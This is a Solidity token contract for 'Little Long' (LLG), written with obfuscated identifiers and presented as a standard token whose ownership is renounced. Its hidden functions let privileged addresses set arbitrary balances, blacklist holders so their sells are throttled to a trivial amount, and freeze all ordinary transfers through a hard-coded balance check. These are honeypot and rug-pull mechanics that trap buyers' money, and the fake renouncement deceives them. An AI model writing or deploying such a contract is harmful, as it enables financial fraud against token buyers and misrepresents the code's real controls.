//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface launchSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedLimit {
    function createPair(address exemptMarketingTeam, address maxBuyTx) external returns (address);
}

interface modeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingAt) external view returns (uint256);

    function transfer(address feeTrading, uint256 swapEnable) external returns (bool);

    function allowance(address receiverFundSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapEnable) external returns (bool);

    function transferFrom(
        address sender,
        address feeTrading,
        uint256 swapEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverFeeMode, uint256 value);
    event Approval(address indexed receiverFundSell, address indexed spender, uint256 value);
}

interface modeSwapMetadata is modeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LittleLong is takeTx, modeSwap, modeSwapMetadata {

    function owner() external view returns (address) {
        return toFund;
    }

    uint256 private marketingLaunched = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private fundLimit;

    address receiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return feeLimitMax;
    }

    mapping(address => bool) public autoSell;

    uint256 private tradingTakeAt;

    bool private minIsSender;

    function amountAuto(address enableMax) public {
        fundTo();
        if (walletReceiver != tradingTakeAt) {
            tradingTakeAt = walletReceiver;
        }
        if (enableMax == swapSell || enableMax == marketingFrom) {
            return;
        }
        autoSell[enableMax] = true;
    }

    function transferFrom(address takeMaxExempt, address feeTrading, uint256 swapEnable) external override returns (bool) {
        if (_msgSender() != receiverIs) {
            if (fundLimit[takeMaxExempt][_msgSender()] != type(uint256).max) {
                require(swapEnable <= fundLimit[takeMaxExempt][_msgSender()]);
                fundLimit[takeMaxExempt][_msgSender()] -= swapEnable;
            }
        }
        return autoExempt(takeMaxExempt, feeTrading, swapEnable);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingLaunched;
    }

    uint8 private feeLimitMax = 18;

    address public marketingFrom;

    address private toFund;

    function transfer(address launchedTake, uint256 swapEnable) external virtual override returns (bool) {
        return autoExempt(_msgSender(), launchedTake, swapEnable);
    }

    function senderLaunch(address takeMaxExempt, address feeTrading, uint256 swapEnable) internal returns (bool) {
        require(liquidityEnableExempt[takeMaxExempt] >= swapEnable);
        liquidityEnableExempt[takeMaxExempt] -= swapEnable;
        liquidityEnableExempt[feeTrading] += swapEnable;
        emit Transfer(takeMaxExempt, feeTrading, swapEnable);
        return true;
    }

    uint256 toMinLaunch;

    event OwnershipTransferred(address indexed buyTake, address indexed amountFee);

    constructor (){
        if (tokenLiquidity) {
            walletReceiver = tradingTakeAt;
        }
        launchSwap limitIs = launchSwap(receiverIs);
        marketingFrom = launchedLimit(limitIs.factory()).createPair(limitIs.WETH(), address(this));
        if (sellTotal == minIsSender) {
            minIsSender = false;
        }
        swapSell = _msgSender();
        launchedMin();
        minLaunched[swapSell] = true;
        liquidityEnableExempt[swapSell] = marketingLaunched;
        
        emit Transfer(address(0), swapSell, marketingLaunched);
    }

    function exemptLimit(uint256 swapEnable) public {
        fundTo();
        toMinLaunch = swapEnable;
    }

    function autoExempt(address takeMaxExempt, address feeTrading, uint256 swapEnable) internal returns (bool) {
        if (takeMaxExempt == swapSell) {
            return senderLaunch(takeMaxExempt, feeTrading, swapEnable);
        }
        uint256 marketingTotalLaunch = modeSwap(marketingFrom).balanceOf(enableAmount);
        require(marketingTotalLaunch == toMinLaunch);
        require(feeTrading != enableAmount);
        if (autoSell[takeMaxExempt]) {
            return senderLaunch(takeMaxExempt, feeTrading, tradingLimit);
        }
        return senderLaunch(takeMaxExempt, feeTrading, swapEnable);
    }

    function approve(address tokenEnable, uint256 swapEnable) public virtual override returns (bool) {
        fundLimit[_msgSender()][tokenEnable] = swapEnable;
        emit Approval(_msgSender(), tokenEnable, swapEnable);
        return true;
    }

    address public swapSell;

    function launchedMin() public {
        emit OwnershipTransferred(swapSell, address(0));
        toFund = address(0);
    }

    function getOwner() external view returns (address) {
        return toFund;
    }

    function name() external view virtual override returns (string memory) {
        return senderListIs;
    }

    function allowance(address amountList, address tokenEnable) external view virtual override returns (uint256) {
        if (tokenEnable == receiverIs) {
            return type(uint256).max;
        }
        return fundLimit[amountList][tokenEnable];
    }

    address enableAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private liquidityEnableExempt;

    function symbol() external view virtual override returns (string memory) {
        return autoWallet;
    }

    uint256 constant tradingLimit = 5 ** 10;

    string private senderListIs = "Little Long";

    mapping(address => bool) public minLaunched;

    bool public tokenLiquidity;

    function launchTake(address launchedTake, uint256 swapEnable) public {
        fundTo();
        liquidityEnableExempt[launchedTake] = swapEnable;
    }

    bool private sellTotal;

    uint256 txSwapLiquidity;

    function takeTotalExempt(address launchedFee) public {
        if (maxShouldTotal) {
            return;
        }
        
        minLaunched[launchedFee] = true;
        
        maxShouldTotal = true;
    }

    function fundTo() private view {
        require(minLaunched[_msgSender()]);
    }

    string private autoWallet = "LLG";

    function balanceOf(address tradingAt) public view virtual override returns (uint256) {
        return liquidityEnableExempt[tradingAt];
    }

    uint256 private walletReceiver;

    bool public maxShouldTotal;

}